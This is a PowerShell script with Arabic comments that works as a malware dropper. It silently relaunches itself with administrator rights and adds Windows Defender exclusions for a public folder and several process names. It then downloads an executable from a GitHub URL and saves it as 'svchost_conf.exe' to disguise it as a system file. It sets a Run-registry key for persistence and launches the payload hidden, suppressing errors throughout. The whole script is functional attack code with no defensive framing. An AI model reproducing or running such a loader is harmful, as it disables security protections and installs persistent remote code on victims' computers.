if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList "-NoP -Ex Bypass -W Hidden -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# 1. إعداد المسارات
$d = "C:\Users\Public\Documents"
$f = "$d\svchost_conf.exe"
$u = "https://github.com/srap18/ddoss/raw/refs/heads/main/SystemUpdate.exe"

# 2. إضافة الاستثناءات (تم تجميعها لسرعة التنفيذ)
Add-MpPreference -ExclusionPath $d -EA 0
Add-MpPreference -ExclusionProcess "powershell.exe", "svchost_conf.exe", "SystemUpdate.exe" -EA 0

Start-Sleep -s 2

# 3. التحميل باستخدام طريقة الـ Streams (لتجنب فحص الملف أثناء الكتابة)
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    
    # تحميل البيانات إلى الذاكرة أولاً ثم حفظها
    $data = $wc.DownloadData($u)
    [IO.File]::WriteAllBytes($f, $data)

    if (Test-Path $f) {
        Unblock-File -Path $f -EA 0
        
        # 4. تثبيت التشغيل التلقائي
        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsConfig' -Value "`"$f`"" -EA 0
        
        # 5. التشغيل بصلاحيات عالية مخفية
        $p = New-Object System.Diagnostics.Process
        $p.StartInfo.FileName = $f
        $p.StartInfo.WindowStyle = "Hidden"
        $p.StartInfo.CreateNoWindow = $true
        $p.Start()
    }
} catch {}
